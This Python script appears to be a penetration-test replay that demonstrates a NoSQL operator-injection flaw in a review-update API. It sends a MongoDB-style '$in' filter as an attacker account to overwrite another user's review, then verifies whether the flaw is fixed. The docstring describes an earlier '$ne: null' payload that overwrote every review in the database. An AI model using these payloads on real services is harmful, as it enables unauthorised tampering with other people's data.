#!/usr/bin/env python3
"""pt29: PATCH /rest/products/reviews passes the client-supplied id
straight into a marsdb (NoSQL) filter with no type check and no
ownership check, letting a MongoDB-style query operator reach and
overwrite reviews that have nothing to do with the caller.

Found black-box, then confirmed its full severity by hand: a single
authenticated request with id set to {"$ne": null} matched every
review in the entire database (38 documents, every product, every
account, including real seeded content) and overwrote all of their
messages in one call. That full-collection run was manual, accidental
in its blast radius, and has been restored from the same response's
own 'original' field (see PREREGISTRATION.md). This scripted,
repeatable version deliberately scopes its proof to two self-created
test reviews, targeted by their own real _id values via the $in
operator, which still demonstrates the identical mechanism (no type
check, no ownership check) without touching anything else.

Corroborated against routes/updateProductReviews.ts: the filter is
{ _id: req.body.id } with { multi: true }, no validation that id is a
plain string, no check that the targeted review(s) belong to the
caller.

Standard library only (urllib, json).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt29-001.json"


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_and_login(target: str, label: str, stamp: str) -> tuple[str, str]:
    email = f"pt29-{label}-{stamp}@flatline.test"
    password = "Pt29Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    return body["authentication"]["token"], email


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    victim_token, victim_email = _register_and_login(target, "victim", stamp)
    attacker_token, attacker_email = _register_and_login(target, "attacker", stamp)

    victim_marker = f"pt29 victim review {stamp}"
    attacker_marker = f"pt29 attacker review {stamp}"
    create_v_status, _ = _request("PUT", f"{target}/rest/products/1/reviews", token=victim_token, body={"message": victim_marker, "author": victim_email})
    create_a_status, _ = _request("PUT", f"{target}/rest/products/2/reviews", token=attacker_token, body={"message": attacker_marker, "author": attacker_email})

    # Find our own two reviews' real _ids (the review list is public).
    _, p1_body = _request("GET", f"{target}/rest/products/1/reviews")
    _, p2_body = _request("GET", f"{target}/rest/products/2/reviews")
    victim_id = next((r["_id"] for r in p1_body.get("data", []) if r.get("message") == victim_marker), None)
    attacker_id = next((r["_id"] for r in p2_body.get("data", []) if r.get("message") == attacker_marker), None)

    if not victim_id or not attacker_id:
        return {
            "vulnerability_id": blueprint["vulnerability_id"],
            "mitre_technique": blueprint["mitre_technique"],
            "target": target,
            "status": "ERROR",
            "summary": f"Could not locate both freshly created reviews (victim_id={victim_id}, attacker_id={attacker_id}).",
            "create_statuses": [create_v_status, create_a_status],
        }

    # The injection: attacker PATCHes using a MongoDB $in operator over
    # exactly the two known _ids, scoped deliberately to avoid touching
    # anything else in the collection.
    payload_message = f"PWNED-BY-PT29-{stamp}"
    exploit_status, exploit_body = _request("PATCH", f"{target}/rest/products/reviews", token=attacker_token, body={
        "id": {"$in": [victim_id, attacker_id]}, "message": payload_message,
    })

    _, p1_after = _request("GET", f"{target}/rest/products/1/reviews")
    victim_review_after = next((r for r in p1_after.get("data", []) if r.get("_id") == victim_id), None)
    victim_overwritten_by_attacker = bool(victim_review_after and victim_review_after.get("message") == payload_message)
    modified_count = exploit_body.get("modified") if isinstance(exploit_body, dict) else None

    if exploit_status == 200 and victim_overwritten_by_attacker and modified_count == 2:
        status_result = "VULNERABLE"
        summary = "A single authenticated PATCH using a $in operator overwrote a review belonging to a different account, no ownership check, no type check on id."
    elif exploit_status == 400:
        status_result = "REMEDIATED"
        summary = "The $in operator in id was rejected (HTTP 400) before reaching the backend; the victim's review was untouched."
    else:
        status_result = "ERROR"
        summary = f"Inconclusive: exploit_status={exploit_status}, victim_overwritten={victim_overwritten_by_attacker}, modified_count={modified_count}."

    # Legitimate case: the victim updates their own review by its real,
    # exact string _id, the normal single-document flow.
    legit_message = f"pt29 victim legit edit {stamp}"
    legit_status, legit_body = _request("PATCH", f"{target}/rest/products/reviews", token=victim_token, body={"id": victim_id, "message": legit_message})
    _, p1_legit = _request("GET", f"{target}/rest/products/1/reviews")
    victim_review_legit = next((r for r in p1_legit.get("data", []) if r.get("_id") == victim_id), None)
    legitimate_own_review_update_ok = legit_status == 200 and bool(victim_review_legit and victim_review_legit.get("message") == legit_message)

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status_result,
        "exploit_http_status": exploit_status,
        "modified_count": modified_count,
        "victim_overwritten_by_attacker": victim_overwritten_by_attacker,
        "summary": summary,
        "legitimate_own_review_update_ok": legitimate_own_review_update_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt29-nosql-review-injection", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
